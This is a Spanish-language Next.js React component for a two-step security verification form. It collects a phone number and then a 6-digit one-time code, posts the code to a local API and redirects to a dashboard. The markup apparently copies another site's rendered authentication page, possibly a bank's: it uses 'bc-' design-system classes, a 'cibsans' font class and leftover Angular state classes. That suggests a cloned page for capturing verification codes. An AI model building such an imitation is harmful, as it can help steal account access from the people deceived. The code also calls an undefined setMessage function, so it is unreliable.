"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

export default function CodeForm({ initialStep = 1, user = "" }) {
  const router = useRouter();
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [step, setStep] = useState(initialStep); // 1: teléfono, 2: código
  const [status, setStatus] = useState("");
  const [error, setError] = useState("");

  const handlePhoneSubmit = (event) => {
    event.preventDefault();
    setStatus("");
    setError("");

    const cleaned = phone.replace(/\D/g, "");
    if (!/^\d{8,15}$/.test(cleaned)) {
      setError("Ingresa un número de teléfono válido (8-15 dígitos).");
      return;
    }

    setPhone(cleaned);
    setStatus("Validando teléfono...");
    router.push(`/loading?next=code&phone=${encodeURIComponent(cleaned)}&user=${encodeURIComponent(user)}`);
  };

  const handleCodeSubmit = async (event) => {
    event.preventDefault();
    setStatus("");
    setError("");

    if (!/^[0-9]{6}$/.test(code)) {
      setError("Ingresa un código válido de 6 dígitos.");
      return;
    }

    setStatus("Validando código...");
    try {
      const response = await fetch("/api/verify-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user, code }),
      });
      const result = await response.json();

      if (!response.ok) {
        setStatus("error");
        setError(result.message || "Código incorrecto.");
        return;
      }

      setStatus("success");
      setMessage(result.message || "Código validado correctamente.");
      setTimeout(() => {
        router.push("/dashboard");
      }, 1000);
    } catch (error) {
      setStatus("error");
      setError("Error de red al verificar código.");
    }
  };

  const handleCancel = () => {
    setStep(1);
    setCode("");
    setStatus("");
    setError("");
  };

  return (
    <section className="bc-card bc-card-auth bc-card-container" style={{ minWidth: "320px" }}>
      <section className="bc-card-auth-body">
        <section className="bc-card-auth-head">
          <section>
            <em aria-hidden="true" className="bc-icon"></em>
          </section>
          <h1 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3">
            Verificación de seguridad
          </h1>
          <h3 className="bc-card-auth-description bc-mt-3">
            Ingresa el código de 6 dígitos que recibiste por tu canal de seguridad.
          </h3>
        </section>

        {step === 1 ? (
          <form onSubmit={handlePhoneSubmit} className="ng-untouched ng-pristine ng-valid">
            <section>
              <section cardauthstaticcontainer="" className="bc-card-auth-container">
                <bc-form-field className="authentication-form__phone">
                  <div className="bc-form-field" id="phone-field">
                    <em aria-hidden="false">phone</em>
                    <input
                      id="phone"
                      type="tel"
                      inputMode="tel"
                      maxLength={15}
                      value={phone}
                      onChange={(e) => setPhone(e.target.value.replace(/[^0-9]/g, ""))}
                      className="bc-input"
                      aria-label="Número de teléfono"
                      placeholder=" "
                    />
                    <label htmlFor="phone">Número de teléfono</label>
                  </div>
                </bc-form-field>
              </section>
            </section>

            <section className="bc-card-auth-button" style={{ display: "grid", gap: "0.75rem" }}>
              <button type="submit" className="bc-button bc-button-fill bc-button-primary" style={{ width: "100%" }}>
                Solicitar código
              </button>
              <button type="button" className="bc-button bc-button-outline" style={{ width: "100%" }} onClick={handleCancel}>
                Cancelar
              </button>
            </section>
          </form>
        ) : (
          <form onSubmit={handleCodeSubmit} className="ng-untouched ng-pristine ng-valid">
            <section>
              <section cardauthstaticcontainer="" className="bc-card-auth-container">
                <bc-form-field className="authentication-form__code">
                  <div className="bc-form-field" id="code-field">
                    <em aria-hidden="false">lock</em>
                    <input
                      id="code"
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={6}
                      value={code}
                      onChange={(e) => setCode(e.target.value.replace(/[^0-9]/g, ""))}
                      className="bc-input"
                      aria-label="Código de 6 dígitos"
                      placeholder=" "
                    />
                    <label htmlFor="code">Código (6 dígitos)</label>
                  </div>
                </bc-form-field>
              </section>
            </section>

            <section className="bc-card-auth-button" style={{ display: "grid", gap: "0.75rem" }}>
              <button type="submit" className="bc-button bc-button-fill bc-button-primary" style={{ width: "100%" }}>
                Verificar
              </button>
              <button type="button" className="bc-button bc-button-outline" style={{ width: "100%" }} onClick={handleCancel}>
                Volver
              </button>
            </section>
          </form>
        )}

        {error && <p className="bc-text-danger bc-mt-2">{error}</p>}
        {status && <p className="bc-text-success bc-mt-2">{status}</p>}
      </section>
    </section>
  );
}
